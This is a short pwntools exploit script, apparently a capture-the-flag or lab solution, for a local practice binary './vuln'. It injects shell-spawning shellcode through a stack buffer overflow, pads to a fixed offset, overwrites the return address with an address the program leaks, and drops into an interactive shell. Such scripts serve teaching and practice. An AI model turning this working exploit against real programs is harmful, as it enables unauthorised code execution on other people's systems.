#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN

# Determined through static analysis.
bytes_read = 200
offset = 0x100

shellcode = asm(shellcraft.sh())

io = process(BIN)
str_addr = io.recvline().strip(b"\n")
addr = int(str_addr, 16)

# Inject and trigger
payload = b""
payload += shellcode
payload += (offset + 8 - len(shellcode)) * b'A'
payload += pack(addr)

io.send(payload)
io.interactive()
